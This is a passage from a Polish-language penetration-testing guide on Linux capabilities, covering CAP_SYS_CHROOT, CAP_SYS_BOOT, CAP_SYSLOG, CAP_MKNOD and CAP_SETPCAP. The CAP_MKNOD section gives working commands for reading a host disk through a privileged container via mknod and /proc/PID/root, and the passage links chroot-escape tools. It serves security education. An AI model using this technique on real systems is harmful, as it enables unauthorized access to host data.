f.write('New content for the file\n')
```
> [!TIP]
> Pamiętaj, że zwykle ten atrybut immutable ustawia się i usuwa za pomocą:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia wykonanie wywołania systemowego `chroot(2)`, co potencjalnie może pozwolić na escape ze środowisk `chroot(2)` za pomocą znanych podatności:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia nie tylko wykonanie wywołania systemowego `reboot(2)` w celu ponownego uruchomienia systemu, w tym określonych poleceń, takich jak `LINUX_REBOOT_CMD_RESTART2`, dostosowanych do konkretnych platform sprzętowych, lecz także użycie `kexec_load(2)` oraz, od Linux 3.17, `kexec_file_load(2)` do ładowania odpowiednio nowych lub podpisanych crash kernelów.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) zostało oddzielone od szerszego **CAP_SYS_ADMIN** w Linux 2.6.37, zapewniając konkretnie możliwość użycia wywołania `syslog(2)`. Capability ta umożliwia wyświetlanie adresów kernela za pośrednictwem `/proc` i podobnych interfejsów, gdy ustawienie `kptr_restrict` ma wartość 1, która kontroluje ujawnianie adresów kernela. Od Linux 2.6.39 domyślną wartością `kptr_restrict` jest 0, co oznacza, że adresy kernela są ujawniane, chociaż wiele dystrybucji ustawia tę wartość na 1 (ukrywanie adresów z wyjątkiem uid 0) lub 2 (zawsze ukrywanie adresów) ze względów bezpieczeństwa.

Dodatkowo **CAP_SYSLOG** umożliwia dostęp do danych wyjściowych `dmesg`, gdy `dmesg_restrict` jest ustawione na 1. Pomimo tych zmian **CAP_SYS_ADMIN** zachowuje możliwość wykonywania operacji `syslog` ze względu na zaszłości historyczne.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) rozszerza funkcjonalność wywołania systemowego `mknod` poza tworzenie zwykłych plików, FIFO (named pipes) lub gniazd domeny UNIX. Umożliwia w szczególności tworzenie plików specjalnych, do których należą:

- **S_IFCHR**: Character special files, czyli urządzenia takie jak terminale.
- **S_IFBLK**: Block special files, czyli urządzenia takie jak dyski.

Capability ta jest niezbędna dla procesów, które wymagają możliwości tworzenia plików urządzeń, ułatwiając bezpośrednią interakcję ze sprzętem za pośrednictwem urządzeń znakowych lub blokowych.

Jest to domyślna capability w dockerze ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Capability ta umożliwia przeprowadzenie privilege escalation (poprzez pełny odczyt dysku) na hoście w następujących warunkach:

1. Początkowy dostęp do hosta (Unprivileged).
2. Początkowy dostęp do kontenera (Privileged (EUID 0) oraz effective `CAP_MKNOD`).
3. Host i kontener powinny współdzielić tę samą user namespace.

**Kroki tworzenia i uzyskiwania dostępu do urządzenia blokowego w kontenerze:**

1. **Na hoście jako standardowy użytkownik:**

- Sprawdź bieżący identyfikator użytkownika za pomocą `id`, np. `uid=1000(standarduser)`.
- Zidentyfikuj docelowe urządzenie, na przykład `/dev/sdb`.

2. **Wewnątrz kontenera jako `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Ponownie na hoście:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
To podejście umożliwia standardowemu użytkownikowi dostęp do danych z `/dev/sdb` za pośrednictwem kontenera i potencjalne ich odczytanie, wykorzystując współdzielone przestrzenie nazw użytkowników oraz uprawnienia ustawione na urządzeniu.

### CAP_SETPCAP

**CAP_SETPCAP** umożliwia procesowi **modyfikowanie zbiorów capabilities** innego procesu, pozwalając na dodawanie lub usuwanie capabilities ze zbiorów effective, inheritable i permitted. Proces może jednak modyfikować wyłącznie capabilities, które posiada we własnym zbiorze permitted, dzięki czemu nie może zwiększyć uprawnień innego procesu ponad poziom własnych uprawnień. Nowsze aktualizacje kernela zaostrzyły te zasady, ograniczając **CAP_SETPCAP** wyłącznie do zmniejszania capabilities w jego własnym zbiorze permitted lub w zbiorach permitted jego potomków, aby ograniczyć zagrożenia bezpieczeństwa. Użycie wymaga posiadania **CAP_SETPCAP** w zbiorze effective oraz docelowych capabilities w zbiorze permitted, a do modyfikacji wykorzystuje się `capset()`. Podsumowuje to podstawowe działanie i ograniczenia **CAP_SETPCAP**, podkreślając jego rolę w zarządzaniu uprawnieniami i zwiększaniu bezpieczeństwa.

**`CAP_SETPCAP`** to Linux capability, która umożliwia procesowi **modyfikowanie zbiorów capabilities innego procesu**. Pozwala dodawać lub usuwać capabilities ze zbiorów effective, inheritable i permitted innych procesów. Istnieją jednak określone ograniczenia dotyczące sposobu korzystania z tej capability.

Proces posiadający **`CAP_SETPCAP`** **może nadawać lub usuwać wyłącznie capabilities znajdujące się w jego własnym zbiorze permitted**. Innymi słowy, proces nie może nadać innej procesowi capability, której sam nie posiada. Ograniczenie to uniemożliwia procesowi zwiększenie uprawnień innego procesu ponad własny poziom uprawnień.

Ponadto w nowszych wersjach kernela capability **`CAP_SETPCAP`** została **dodatkowo ograniczona**. Nie pozwala już procesowi na dowolne modyfikowanie zbiorów capabilities innych procesów. Zamiast tego **umożliwia procesowi wyłącznie zmniejszanie capabilities we własnym zbiorze permitted lub w zbiorze permitted jego potomków**. Zmiana ta została wprowadzona w celu ograniczenia potencjalnych zagrożeń bezpieczeństwa związanych z tą capability.

Aby skutecznie korzystać z **`CAP_SETPCAP`**, należy posiadać tę capability w zbiorze effective oraz docelowe capabilities w zbiorze permitted. Następnie można użyć wywołania systemowego `capset()` do modyfikowania zbiorów capabilities innych procesów.

Podsumowując, **`CAP_SETPCAP`** umożliwia procesowi modyfikowanie zbiorów capabilities innych procesów, ale nie może nadawać capabilities, których sam nie posiada. Dodatkowo, ze względów bezpieczeństwa, w nowszych wersjach kernela jej funkcjonalność została ograniczona wyłącznie do zmniejszania capabilities we własnym zbiorze permitted lub w zbiorach permitted procesów potomnych.

## Referencje

**Większość tych przykładów pochodzi z niektórych laboratoriów** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), więc jeśli chcesz przećwiczyć te techniki privesc, polecam te laboratoria.

**Inne referencje**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
